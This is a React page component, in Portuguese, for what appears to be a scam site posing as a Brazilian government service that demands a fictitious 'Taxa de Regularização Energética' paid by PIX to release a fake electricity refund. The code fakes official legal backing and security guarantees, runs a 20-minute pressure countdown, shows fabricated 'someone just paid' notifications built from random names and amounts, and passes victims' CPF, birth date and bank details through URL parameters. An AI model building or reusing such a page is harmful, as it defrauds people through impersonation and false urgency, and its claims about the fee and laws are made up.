import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell, Loader } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { Toaster } from "@/components/ui/toaster";
import { playNotificationSound } from "@/components/NotificationSound";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { paymentApi } from "@/lib/for4payments";

// Gerar um código PIX aleatório
const gerarCodigoPix = () => {
  const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  let codigo = "";
  for (let i = 0; i < 32; i++) {
    codigo += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return codigo.match(/.{1,4}/g)?.join(" ") || "";
};

// Nomes para as notificações
const nomes = [
  "Pedro", "Maria", "João", "Ana", "Carlos", "Fernanda", "Lucas", "Júlia", 
  "Rafael", "Mariana", "Bruno", "Camila", "Diego", "Isabela", "Gustavo", 
  "Letícia", "Henrique", "Amanda", "Felipe", "Natália", "Ricardo", "Larissa",
  "Rodrigo", "Carla", "Alexandre", "Beatriz", "Eduardo", "Vanessa", "Marcelo", "Bianca"
];

// Componente de notificação
interface NotificacaoProps {
  nome: string;
  valor: string;
  onClose: () => void;
}

const Notificacao = ({ nome, valor, onClose }: NotificacaoProps) => {
  // Não precisamos mais tocar o som aqui, pois já estamos tocando no nível superior
  // Este componente agora é apenas visual
  
  return (
    <div className="max-w-sm w-full bg-white shadow-lg rounded-lg border border-gray-200 overflow-hidden">
      <div className="flex items-start p-3">
        <div className="flex-shrink-0 pt-0.5">
          <div className="h-8 w-8 rounded-full bg-green-100 flex items-center justify-center">
            <Bell className="h-4 w-4 text-green-600" />
          </div>
        </div>
        <div className="ml-3 w-0 flex-1">
          <p className="text-sm font-medium text-gray-900">
            Nova transação
          </p>
          <p className="mt-1 text-sm text-gray-500">
            <strong>{nome}</strong> acabou de pagar a TRE para uma restituição de <strong className="text-green-600">{valor}</strong>
          </p>
        </div>
        <div className="ml-4 flex-shrink-0 flex">
          <button
            className="bg-white rounded-md inline-flex text-gray-400 hover:text-gray-500 focus:outline-none"
            onClick={onClose}
          >
            <span className="sr-only">Fechar</span>
            <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
              <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
          </button>
        </div>
      </div>
    </div>
  );
};

// Formatar um valor monetário
const formatarValor = (valor: number) => {
  return valor.toLocaleString('pt-BR', { 
    style: 'currency', 
    currency: 'BRL' 
  });
};

// Interface para as informações do pagamento da API
interface PaymentInfo {
  id: string;
  pixCode: string;
  pixQrCode: string;
  expiresAt: string;
  status: string;
}

// Componente principal da página
export default function PagamentoPix() {
  const [location, navigate] = useLocation();
  const { toast } = useToast();
  
  // Obter parâmetros da URL
  const urlParams = new URLSearchParams(window.location.search);
  
  // Dados da restituição
  const cpf = urlParams.get('cpf') || "";
  const nome = urlParams.get('nome') || "";
  
  // Corrigir a formatação do valor - converter centavos para reais
  let valor = 0;
  const valorParam = urlParams.get('valor') || "0";
  if (valorParam) {
    // Se o valor for maior que 10.000, provavelmente está em centavos
    // e precisa ser convertido para reais
    const valorNumerico = parseFloat(valorParam);
    valor = valorNumerico > 10000 ? valorNumerico / 100 : valorNumerico;
  }
  
  const email = urlParams.get('email') || `${cpf.substring(0, 3)}xxx${cpf.substring(9, 11)}@restituicao.gov.br`;
  const telefone = urlParams.get('telefone') || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
  const valorFormatado = formatarValor(valor);
  const valorTaxaFormatado = formatarValor(74.90);
  
  // Estados relacionados ao pagamento
  const [isLoading, setIsLoading] = useState(false);
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<string>('pending');
  const [codigoPix, setCodigoPix] = useState('');
  const [copied, setCopied] = useState(false);
  
  // Estado para as notificações
  const [notificacoes, setNotificacoes] = useState<{ id: number; nome: string; valor: string }[]>([]);
  
  // Estado para o contador regressivo (20 minutos = 1200 segundos)
  const [tempoRestante, setTempoRestante] = useState(1200);
  
  // Gerar um valor aleatório para notificações
  const gerarValorAleatorio = () => {
    const valor = 1800 + Math.random() * 1200; // Entre 1800 e 3000
    return formatarValor(valor);
  };
  
  // Função para gerar uma notificação
  const gerarNotificacao = () => {
    const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
    const valorAleatorio = gerarValorAleatorio();
    
    // Gera um ID único com timestamp + número aleatório para evitar colisões
    const id = Date.now() + Math.floor(Math.random() * 10000);
    setNotificacoes(prev => [...prev, { id, nome: nomeAleatorio, valor: valorAleatorio }]);
  };
  
  // Remover uma notificação
  const removerNotificacao = (id: number) => {
    setNotificacoes(prev => prev.filter(notif => notif.id !== id));
  };
  
  // Copiar o código PIX
  const copiarCodigoPix = () => {
    // Não modificar o código PIX, copiar exatamente como veio da API
    navigator.clipboard.writeText(codigoPix);
    setCopied(true);
    toast({
      title: "Código copiado!",
      description: "O código PIX foi copiado para a área de transferência.",
    });
    
    setTimeout(() => setCopied(false), 3000);
  };
  
  // Simular o pagamento (para fins de demonstração)
  const simularPagamento = () => {
    navigate("/sucesso");
  };
  
  // Formatar o tempo do contador (mm:ss)
  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segs = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
  };
  
  // Criar pagamento PIX
  const criarPagamento = async () => {
    try {
      setIsLoading(true);
      
      // Chamar a API para criar um pagamento
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          nome: nome,
          cpf: cpf,
          email: email,
          telefone: telefone,
          valor: 74.90
        })
      });

      if (!response.ok) {
        throw new Error('Falha ao gerar o pagamento');
      }

      const payment = await response.json();
      setPaymentInfo(payment);
      setCodigoPix(payment.pixCode);
      
      toast({
        title: "Pagamento gerado com sucesso!",
        description: "Use o QR code ou código PIX para efetuar o pagamento."
      });
    } catch (error) {
      console.error('Erro ao criar pagamento:', error);
      toast({
        title: "Erro ao gerar pagamento",
        description: "Não foi possível gerar o código PIX. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Verificar status do pagamento
  const verificarStatusPagamento = async () => {
    if (!paymentInfo?.id) return;
    
    setIsLoading(true);
    
    try {
      const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
      
      if (response.ok) {
        const data = await response.json();
        setPaymentStatus(data.status);
        
        if (data.status === 'completed') {
          toast({
            title: "Pagamento confirmado!",
            description: "Seu pagamento foi processado com sucesso. Redirecionando...",
            variant: "default"
          });
          
          // Redirecionar para a página de sucesso com todos os parâmetros necessários
          const params = new URLSearchParams({
            cpf: cpf,
            nome: nome,
            valor: valor.toString(),
            pagamentoId: paymentInfo.id,
            dataPagamento: new Date().toISOString(),
            companhia: urlParams.get('companhia') || "CEMIG Distribuição",
            estado: urlParams.get('estado') || "Minas Gerais",
            nasc: urlParams.get('nasc') || "21/07/2003",
            agencia: urlParams.get('agencia') || "",
            conta: urlParams.get('conta') || "",
            email: email,
            telefone: telefone
          });
          
          // Redirecionar para a página de sucesso
          setTimeout(() => {
            navigate(`/sucesso?${params.toString()}`);
          }, 1500);
        }
      }
    } catch (error) {
      console.error('Erro ao verificar status do pagamento:', error);
      toast({
        title: "Erro na verificação",
        description: "Não foi possível verificar o status do pagamento. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Efeito para criar o pagamento quando a página carregar
  useEffect(() => {
    criarPagamento();
  }, []);

  // Efeito para verificar o status do pagamento periodicamente
  useEffect(() => {
    if (!paymentInfo?.id) return;
    
    // Verificação inicial
    verificarStatusPagamento();
    
    // Configurar intervalo para verificar a cada 10 segundos
    const statusInterval = setInterval(() => {
      verificarStatusPagamento();
    }, 10000); // Verificar a cada 10 segundos
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [paymentInfo]);

  // Efeito para o contador regressivo
  useEffect(() => {
    // Contador regressivo
    const timerInterval = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timerInterval);
          toast({
            title: "Tempo esgotado!",
            description: "O tempo para pagamento da TRE expirou.",
            variant: "destructive",
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(timerInterval);
    };
  }, []);
  
  // Efeito separado apenas para o sistema de notificações
  // Isso ajuda a evitar problemas de re-renderização causando múltiplas notificações
  useEffect(() => {
    // Referência para os timeouts que vamos limpar no unmount
    const timeoutRefs: NodeJS.Timeout[] = [];
    
    // Limpar notificações anteriores
    setNotificacoes([]);
    
    // Função recursiva para criar o ciclo de notificações
    function criarCicloNotificacoes(tempoInicial: number) {
      // 1. Agendar aparecimento da notificação
      const notificationTimeout = setTimeout(() => {
        // Tocar o som de notificação
        playNotificationSound();
        
        // Criar uma notificação
        const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
        const valorAleatorio = gerarValorAleatorio();
        const id = Date.now();
        
        // Adicionar a notificação ao estado
        setNotificacoes([{ id, nome: nomeAleatorio, valor: valorAleatorio }]);
        
        // 2. Agendar remoção da notificação após 5 segundos
        const removalTimeout = setTimeout(() => {
          // Remover a notificação
          setNotificacoes([]);
          
          // 3. Agendar próxima notificação após 7 segundos do desaparecimento
          criarCicloNotificacoes(7000);
        }, 5000);
        
        // Guardar a referência para limpar no unmount
        timeoutRefs.push(removalTimeout);
        
      }, tempoInicial);
      
      // Guardar a referência para limpar no unmount
      timeoutRefs.push(notificationTimeout);
    }
    
    // Iniciar o primeiro ciclo após 7 segundos
    criarCicloNotificacoes(7000);
    
    // Limpar todos os timeouts no unmount para evitar memory leaks
    return () => {
      timeoutRefs.forEach(timeout => clearTimeout(timeout));
    };
  }, []);

  return (
    <>
      <Header />
      <main className="container mx-auto px-4 py-8 min-h-screen">
        {/* Este componente é necessário para o toast */}
        <Toaster />
        
        <div className="max-w-4xl mx-auto">
          <h1 className="text-3xl font-bold text-[var(--gov-blue-dark)] mb-6">
            Pagamento da Taxa de Regularização Energética (TRE)
          </h1>
        
          <div className="mb-6 space-y-4">
            <Alert className="bg-red-50 border-red-200">
              <div className="flex items-center">
                <AlertCircle className="h-5 w-5 text-red-600 flex-shrink-0 mr-2" />
                <AlertTitle className="text-red-800 font-bold text-lg">AÇÃO OBRIGATÓRIA PARA RECEBIMENTO</AlertTitle>
              </div>
              <AlertDescription className="text-red-700 mt-2">
                Para que o valor de <strong className="font-bold">{valorFormatado}</strong> seja liberado para depósito em sua conta bancária, é <span className="underline font-bold">obrigatório</span> o pagamento da Taxa de Regularização Energética (TRE).
              </AlertDescription>
            </Alert>
            
            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
              <div className="flex items-center mb-2">
                <AlertTriangle className="h-5 w-5 text-amber-600 flex-shrink-0 mr-2" />
                <h3 className="text-amber-800 font-bold">ATENÇÃO: PRAZO FINAL PARA PAGAMENTO</h3>
              </div>
              <p className="text-amber-700">
                Conforme regulamento oficial, o pagamento da TRE deve ser realizado no prazo máximo de <strong>20 minutos</strong>. 
                Após esse prazo, a solicitação será cancelada automaticamente, e o valor reservado será devolvido ao 
                Fundo Nacional de Compensação Tarifária, ficando indisponível para nova solicitação.
              </p>
            </div>
          </div>
          
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="lg:col-span-2">
              <Card>
                <CardContent className="p-6">
                  <h2 className="text-xl font-semibold mb-4 text-[var(--gov-blue-dark)]">Informações da Restituição</h2>
                  
                  <div className="space-y-4">
                    <div>
                      <p className="text-gray-500 text-sm">Nome</p>
                      <p className="font-medium">{nome}</p>
                    </div>
                    
                    <div>
                      <p className="text-gray-500 text-sm">CPF</p>
                      <p className="font-medium">{cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</p>
                    </div>

                    <div>
                      <p className="text-gray-500 text-sm">Data de Nascimento</p>
                      <p className="font-medium">{urlParams.get('nasc') || "21/07/2003"}</p>
                    </div>
                    
                    <div>
                      <p className="text-gray-500 text-sm">Concessionária de Energia</p>
                      <p className="font-medium">{urlParams.get('companhia') || "CEMIG Distribuição"}</p>
                    </div>
                    
                    <div>
                      <p className="text-gray-500 text-sm">Estado</p>
                      <p className="font-medium">{urlParams.get('estado') || "Minas Gerais"}</p>
                    </div>
                    
                    
                    <div>
                      <p className="text-gray-500 text-sm">Valor a Receber</p>
                      <p className="font-medium text-xl text-green-600">{valorFormatado}</p>
                    </div>
                    
                    <Separator />
                    
                    <div>
                      <p className="text-gray-500 text-sm">Taxa de Regularização Energética (TRE)</p>
                      <p className="font-medium text-orange-600">{valorTaxaFormatado}</p>
                    </div>

                    <div>
                      <p className="text-gray-500 text-sm">Prazo de Conclusão</p>
                      <p className="font-medium">Até 72 horas úteis após o pagamento</p>
                    </div>
                  </div>
                  
                  <div className="mt-6 bg-blue-50 p-6 rounded-lg">
                    <div className="flex flex-col">
                      <h3 className="text-blue-800 font-bold text-center text-xl mb-3">O que é a Taxa de Regularização Energética (TRE)?</h3>
                      <p className="text-blue-700 text-center mb-4">
                        A TRE é um tributo técnico-administrativo previsto no programa de Compensação Tarifária Nacional, 
                        instituído para custear os seguintes serviços públicos:
                      </p>
                      <div className="bg-white rounded-lg p-4 border border-blue-200">
                        <ul className="list-disc pl-5 text-blue-700 space-y-2">
                          <li className="font-medium">Auditoria dos dados de consumo e histórico tarifário;</li>
                          <li className="font-medium">Validação junto aos órgãos reguladores (ANEEL/Receita);</li>
                          <li className="font-medium">Liberação segura dos valores via sistema bancário nacional (Pix).</li>
                        </ul>
                      </div>
                      <div className="mt-4 bg-blue-100 p-4 rounded-md">
                        <div className="grid grid-cols-1 gap-3">
                          <div className="bg-white rounded-md p-3 border border-blue-200 shadow-sm">
                            <p className="text-[var(--gov-blue-dark)] font-bold text-center">VALOR DA TAXA:</p>
                            <p className="text-xl font-bold text-center text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
                          </div>
                          
                          <div className="bg-white rounded-md p-3 border border-blue-200 shadow-sm">
                            <p className="text-[var(--gov-blue-dark)] font-bold text-center">MEIO DE PAGAMENTO:</p>
                            <p className="text-center font-medium">PIX (QR Code ou Copia e Cola)</p>
                          </div>
                          
                          <div className="bg-white rounded-md p-3 border border-blue-200 shadow-sm">
                            <p className="text-[var(--gov-blue-dark)] font-bold text-center">PRAZO PARA PAGAMENTO:</p>
                            <p className="text-center font-medium">20 minutos após o acesso desta página</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-6 space-y-4">
                    <div className="border border-green-200 bg-green-50 rounded-lg p-4">
                      <h3 className="font-bold text-green-800 text-center text-lg">GARANTIA DE SEGURANÇA</h3>
                      <p className="text-green-700 mt-2 text-center">
                        Este procedimento é fiscalizado e regulamentado por órgãos oficiais, com garantia de:
                      </p>
                      <ul className="list-disc pl-5 mt-3 text-green-700 space-y-1">
                        <li>Conformidade com a LGPD (Lei Geral de Proteção de Dados);</li>
                        <li>Consultas criptografadas com tecnologia GOV.BR;</li>
                        <li>Registro no sistema nacional de restituição tarifária.</li>
                      </ul>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
            
            <div>
              <Card className="sticky top-4">
                <CardContent className="p-6">
                  <div className="flex justify-between items-center mb-4">
                    <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)]">Pagamento via PIX</h2>
                    <div className="flex items-center">
                      <span className="text-red-600 font-medium mr-2">Tempo:</span>
                      <div className="bg-red-50 px-3 py-2 rounded-lg border border-red-200 shadow-sm">
                        <div className={`font-mono font-bold text-lg ${tempoRestante < 300 ? 'text-red-600 animate-pulse' : 'text-red-600'}`}>
                          {formatarTempo(tempoRestante)}
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <Tabs defaultValue="qrcode">
                    <TabsList className="w-full mb-4">
                      <TabsTrigger value="qrcode" className="flex-1">QR Code</TabsTrigger>
                      <TabsTrigger value="copiacola" className="flex-1">Copia e Cola</TabsTrigger>
                    </TabsList>
                    
                    <TabsContent value="qrcode" className="mt-2">
                      <div className="flex flex-col items-center justify-center">
                        {isLoading ? (
                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
                          </div>
                        ) : !paymentInfo ? (
                          <div className="py-8 text-center space-y-4">
                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
                            <Button 
                              onClick={criarPagamento} 
                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
                            >
                              Tentar Novamente
                            </Button>
                          </div>
                        ) : (
                          <>
                            <div className="border-4 border-[var(--gov-blue)] rounded-lg p-3 mb-4">
                              <img 
                                src={paymentInfo.pixQrCode}
                                alt="QR Code do PIX" 
                                className="w-full h-auto" 
                              />
                            </div>
                            <div className="bg-gray-50 w-full p-4 rounded-lg text-center border border-gray-200">
                              <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
                              <p className="text-xs text-gray-500 mt-1">TRE - Taxa de Regularização Energética</p>
                            </div>
                          </>
                        )}
                      </div>
                    </TabsContent>
                    
                    <TabsContent value="copiacola" className="mt-2">
                      <div>
                        {isLoading ? (
                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
                          </div>
                        ) : !paymentInfo ? (
                          <div className="py-8 text-center space-y-4">
                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
                            <Button 
                              onClick={criarPagamento} 
                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
                            >
                              Tentar Novamente
                            </Button>
                          </div>
                        ) : (
                          <>
                            <p className="text-sm text-gray-600 mb-2">Copie o código abaixo:</p>
                            <div className="flex items-center">
                              <div className="flex-1 bg-gray-100 p-3 rounded-l-md font-mono text-xs break-all">
                                {codigoPix}
                              </div>
                              <button 
                                onClick={copiarCodigoPix}
                                className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
                              >
                                {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
                              </button>
                            </div>
                            <div className="bg-gray-50 w-full p-4 rounded-lg text-center mt-4 border border-gray-200">
                              <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
                              <p className="text-xs text-gray-500 mt-1">TRE - Taxa de Regularização Energética</p>
                            </div>
                          </>
                        )}
                      </div>
                    </TabsContent>
                  </Tabs>
                  
                  <div className="mt-6 space-y-4">
                    <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 text-center">
                      <p className="text-yellow-800 font-medium">
                        Faça o pagamento em até <span className="font-bold">{formatarTempo(tempoRestante)}</span> para evitar o cancelamento automático da sua restituição.
                      </p>
                    </div>
                    
                    <Button 
                      onClick={verificarStatusPagamento}
                      disabled={!paymentInfo || isLoading || paymentStatus === 'completed'}
                      className={`w-full font-bold py-4 text-lg transition-all duration-300 transform hover:scale-105 ${
                        paymentStatus === 'completed' 
                          ? 'bg-green-500 hover:bg-green-600 text-white' 
                          : 'bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white'
                      }`}
                    >
                      {paymentStatus === 'completed' ? (
                        <div className="flex items-center justify-center">
                          <CheckCircle className="mr-2 h-5 w-5" />
                          Pagamento Confirmado
                        </div>
                      ) : isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader className="mr-2 h-5 w-5 animate-spin" />
                          Verificando...
                        </div>
                      ) : (
                        "Já fiz o pagamento"
                      )}
                    </Button>
                    
                    <p className="text-xs text-gray-500 text-center">
                      Após o pagamento, clique no botão acima para validar e liberar seu crédito de <strong>{valorFormatado}</strong>
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
          
          {/* FAQ Section - Moved below the payment information */}
          <div className="mt-10 max-w-4xl mx-auto">
            <h2 className="text-2xl font-bold text-[var(--gov-blue-dark)] mb-4">
              Perguntas Frequentes (FAQ)
            </h2>
            <div className="border border-gray-200 rounded-lg p-6 bg-white">
              <div className="space-y-6">
                <div>
                  <h4 className="font-medium text-[var(--gov-blue-dark)] text-lg">1. Por que estou pagando uma taxa se o valor é meu por direito?</h4>
                  <p className="text-gray-600 mt-1">
                    A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, 
                    evitando fraudes, duplicidades e erros de restituição.
                  </p>
                </div>
                <div>
                  <h4 className="font-medium text-[var(--gov-blue-dark)] text-lg">2. A restituição é garantida após o pagamento da TRE?</h4>
                  <p className="text-gray-600 mt-1">
                    Sim. Após a confirmação, o valor de {valorFormatado} será depositado em até 72 horas úteis, 
                    conforme calendário de restituição oficial.
                  </p>
                </div>
                <div>
                  <h4 className="font-medium text-[var(--gov-blue-dark)] text-lg">3. Posso pagar a taxa depois?</h4>
                  <p className="text-gray-600 mt-1">
                    Não. A janela de restituição é única e exclusiva. Caso a TRE não seja quitada dentro do prazo informado, 
                    o crédito será cancelado automaticamente e não poderá ser solicitado novamente.
                  </p>
                </div>
                <div>
                  <h4 className="font-medium text-[var(--gov-blue-dark)] text-lg">4. Como sei que isso é oficial?</h4>
                  <p className="text-gray-600 mt-1">
                    Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, 
                    e validado pela ANEEL e Receita Federal.
                  </p>
                </div>
                <div>
                  <h4 className="font-medium text-[var(--gov-blue-dark)] text-lg">5. O que acontece após o pagamento?</h4>
                  <p className="text-gray-600 mt-1">
                    Após o pagamento da TRE, o sistema irá processar automaticamente a sua solicitação e liberar o valor para 
                    depósito na conta bancária ou chave PIX informada na etapa anterior. Todo o processo é auditado e garantido 
                    pelos órgãos reguladores.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        {/* Notificações no topo da tela */}
        <div className="fixed top-20 right-0 left-0 z-50 flex justify-center pointer-events-none">
          <div className="w-full max-w-md mx-auto space-y-2 pointer-events-auto">
            {notificacoes.length > 0 && (
              <Notificacao 
                key={notificacoes[0].id}
                nome={notificacoes[0].nome}
                valor={notificacoes[0].valor}
                onClose={() => removerNotificacao(notificacoes[0].id)}
              />
            )}
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}